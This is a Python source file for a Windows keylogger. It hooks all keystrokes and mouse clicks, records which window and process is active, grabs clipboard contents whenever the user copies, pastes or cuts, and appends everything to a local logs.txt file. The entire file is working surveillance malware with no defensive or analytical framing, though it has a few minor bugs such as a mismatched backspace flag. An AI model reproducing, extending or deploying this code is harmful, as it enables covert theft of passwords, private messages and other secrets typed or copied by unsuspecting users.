from pynput.keyboard import Listener as KeyboardListener, Key
from pynput.mouse import Listener as MouseListener
from pynput.keyboard._win32 import KeyCode
from ctypes import windll, create_unicode_buffer
from win32process import GetWindowThreadProcessId
from time import strftime, localtime
from psutil import Process
from win32clipboard import OpenClipboard, CloseClipboard, GetClipboardData



SEP = '~'  # Seperator -- as in what seprates the data in 'logs' file DON'T USE [*]

CLICK = '|' # Character/string to insert when user clicks
ENTER = '^'  # Character/string to insert when user presses enter'

FILEPATH = 'logs.txt' # Where to store the logs, try to use full path



back_allowed = True  # Just to keep track of whether to allow backspace or not)

# I know there's no need for a class structure, but too many functions were a mess to look at
class Log:
    '''
    Just a simple class that stores keystrokes as a string (Until active window changes)
    If the user changes program, log will save the string in file and start with empty string
    '''
    def __init__(self):
        self._data = str()

    def put(self, data):
        if type(data) == str(): self._data += data
        else: self._data += str(data)

    def get(self):
        data = self._data
        self._data = str()
        return data.replace(SEP, '*') if SEP in data else data


class File:
    '''
    Class for uploading data to file
    '''
    def __init__(self, path):
        self.path = path # Path of file
        self.buffer = str() # Maintains a buffer to keep data in case of any Faliure

    def upload(self, data):
        # Try to upload, if fails, append to buffer
        try:
            with open(self.path, 'a', encoding='utf-8') as file:  file.write(self.buffer + data)
            self.buffer = str()
        except:
            self.buffer += data


class Utility:
    '''
    Handles various operations
    '''
    def __init__(self, log, file):
        self.winfo = {
            'title': 'Null',
            'started': 'Null',
            'name': 'Null'
        }
        self.log = log
        self.file = file
        self.win_title()

    def win_title(self):
        # Gets information on active window
        hWnd = windll.user32.GetForegroundWindow()
        pid = GetWindowThreadProcessId(hWnd)[1]
        length = windll.user32.GetWindowTextLengthW(hWnd)
        buf = create_unicode_buffer(length + 1)
        windll.user32.GetWindowTextW(hWnd, buf, length + 1)
        process = Process(pid)
        self.winfo['title'] = str(buf.value) if buf.value else 'None'
        self.winfo['name'] = process.name()
        self.winfo['started'] = strftime(f'%H:%M:%S', localtime(process.create_time()))
        return self.winfo

    def upload_if_title_is_new(self):
        # Checks if application/title is changed, if yes, upload the log string and start fresh
        pinfo = self.winfo.copy()
        if pinfo != self.win_title():
            self.file.upload(
                self.format_data(data=self.log.get(),
                                 title=pinfo['title'],
                                 name=pinfo['name'],
                                 started=pinfo['started']))

    def format_data(self, data='Null', time=None, title=None, name=None, started=None):
        # Formats the data, duh
        if not time: time = strftime(f'%Y-%m-%d{SEP}%H:%M:%S')
        if not title: title = self.winfo['title']
        if not name: name = self.winfo['name']
        if not started: started = self.winfo['started']
        return f'{time}{SEP}{title}{SEP}{name}{SEP}{started}{SEP}{data}\n'

    def clipboard(self, process: str()):
        # When user copies/pastes/cuts any text, it also gets logged
        OpenClipboard()
        data = GetClipboardData()
        CloseClipboard()
        self.file.upload(
            self.format_data(
            data=data.encode(),
            name=f'Clipboard:{process}',
        ))

keypad = {
    "<12>": "{hOmE}",
    "<96>": "0",
    "<97>": "1",
    "<98>": "2",
    "<99>": "3",
    "<100>": "4",
    "<101>": "5",
    "<102>": "6",
    "<103>": "7",
    "<104>": "8",
    "<105>": "9",
}

def keyboard_press(key):
    # This function is called whenever a key is pressed
    global log, BACK_ALLOWED
    util.upload_if_title_is_new()
    if type(key) == KeyCode:
        if len(str(key)) == 3:
            log.put(key.char)
            BACK_ALLOWED = True
        elif key.char == '\x03': util.clipboard('copy')
        elif key.char == '\x16': util.clipboard('paste')
        elif key.char == '\x18': util.clipboard('cut')
        elif key.char == '\x1a': log.put('{undo}')
        elif key.char == '\x19': log.put('{redo}')
        elif key.char == '\x10': log.put('{print}')
        elif not key.char:
            log.put(keypad[str(key)])
    else:
        if key == Key.space: log.put(' ')
        elif key == Key.enter: log.put(ENTER)
        elif key == Key.backspace and BACK_ALLOWED:
            if log._data: log._data = log._data[:-1]
        elif key == Key.tab: log.put('\t')

def mouse_press(x, y, button, pressed):
    # This function is called whenever a mouse button is pressed
    if not pressed: return  # Ignore button release
    global log, BACK_ALLOWED
    log.put(CLICK)
    BACK_ALLOWED = False
    util.upload_if_title_is_new()

if __name__ == '__main__':
    # Make instances and give them to the Utility class instance
    log = Log()
    file = File(FILEPATH)
    util = Utility(log, file)

    # Start and join the keyboard and mouse hooks to main
    keyboard_hook = KeyboardListener(on_press=keyboard_press)
    mouse_hook = MouseListener(on_click=mouse_press)
    keyboard_hook.start()
    mouse_hook.start()
    keyboard_hook.join()
    mouse_hook.join()
